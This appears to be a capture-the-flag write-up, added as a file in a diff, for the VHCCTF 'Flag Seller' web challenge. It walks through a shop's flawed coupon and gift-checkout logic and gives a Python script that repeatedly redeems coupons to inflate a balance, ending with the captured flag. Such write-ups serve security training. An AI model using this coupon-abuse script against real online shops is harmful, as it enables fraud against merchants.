@@ -1,0 +1,126 @@
+FLAG SELLER (VHCCTF)
+
+Welcome to VHC's Shopping Mail! Our digital market is aimed to beat all Lozodo, 
+Seehop and all the marketplace out there! Can you imagine how a "passwordless", 
+and even "usernameless" marketplace could be such a greatttt invention??
+
+For this one and only 9/12 sale, we will discount allll the things for you to buy!
+
+Enjoyyy!!!!
+Guide:
+
+    Turn on your Docker instance.
+    Access: http://14.225.211.39:$PORT where $PORT is the port number given by the system.
+    pwn!
+
+Notes:
+
+    The revert button only refresh the Docker instance for you, not to be used for deleting the containers.
+    Because of performance-critical reasons, we will shut down all of the containers periodically (2-4 hours). 
+    We will put announcement when we nuke all of the containers.
+
+[!] Target:  http://14.225.211.39:$PORT/
+
+[*] Build Docker
+
+    [>>>] "docker build -t flag_seller"
+
+[*] Solution 
+
+    [-] First, I see this website, I didn't see login or register. I think about Race Condition. 
+
+    [-] However, given the fact that the server is very slow. 
+        So, I think every body are flooding the server.
+
+        [>>>] So that not the Race Condition vulnerability
+
+    [-] Take another look at the site, I have some result for this challenge
+
+        [+] Endpoint [/]
+
+            - The redeem coupon is not work with anything.
+
+            - Everything feedback will return "THANKYOU" as a discount code. 
+
+        [+] Endpoint [/add_to_cart]
+
+            - In this Endpoint, I saw the numbers of item can change by editing the cookie.
+
+        [+] Endpoint [/checkout?]
+
+            - If I checkout item "Gift", I will receive $100 back and I can also get coupon for discounted items.
+
+    [-] So, I have my exploitation plan like this: 
+
+        [+] If I add 10 "Gift" to my cart. So when I checkout, I will get back 10 coupons equivalent $1000
+
+        [+] "THANKYOU" is the discount code I got.
+
+[*] This is my exploitation script 
+
+'''
+import requests
+import re
+
+url = "http://14.225.211.39:34126/"
+
+session = requests.session()
+session_get = session.get(url)
+
+def apply_discount(session):
+    discount = session.post(url + "/cart", data={"discount_code": "THANKYOU"})
+
+def add_item(session, item_id):
+    session.post(url + f"/add_to_cart/{item_id}")
+
+def add_multiple_items(session, item_ids):
+    for item_id in item_ids:
+        add_item(session, item_id)
+        print(f"[-] Item {item_id} added to cart.")
+
+def pay_and_get_discount_code(session):
+    check_out = session.get(url + "/checkout?")
+    message = check_out.text
+    coupons = message.split(": ")[1].split(", ")
+    print(f"[*] Received {len(coupons)} coupons.")
+
+    return coupons
+
+def redeem_coupon(session, coupon):
+    redeem = session.post(url + "/submit_coupon", data={"coupon": coupon})
+    print(redeem.text)
+
+def get_balance(session):
+    final_cart = session.get(url + "/cart").text
+    user_balance = int(re.search(r'<p>User\'s Balance: \$([\d,]+)</p>', final_cart).group(1)) if re.search(
+        r'<p>User\'s Balance: (\$[\d,]+)</p>', final_cart) else 0
+    print(f"[*] Now, you're having: {user_balance}")
+    return user_balance
+
+def buy_flag(session):
+    while get_balance(session) < 1337:
+        apply_discount(session)
+        add_multiple_items(session, ["gift"] * 10)
+        coupons = pay_and_get_discount_code(session)
+        for coupon in coupons:
+            redeem_coupon(session, coupon)
+        print()
+
+    print(f'Current balance: {get_balance(session)}')
+    print("[-] Buying flag...")
+
+    apply_discount(session)
+    add_item(session, "flag")
+
+    print("[-] Checking out for flag...")
+    check_out = session.get(url + "/checkout?")
+    flag_mess = check_out.text
+
+    print(flag_mess)
+
+buy_flag(session)
+'''
+
+[*] Right now, I'm having $1500 and I can buy flag
+        
+    [>>>] Flag: VHC2023{th4nk_y0u_4_th3_d1sc0unt}
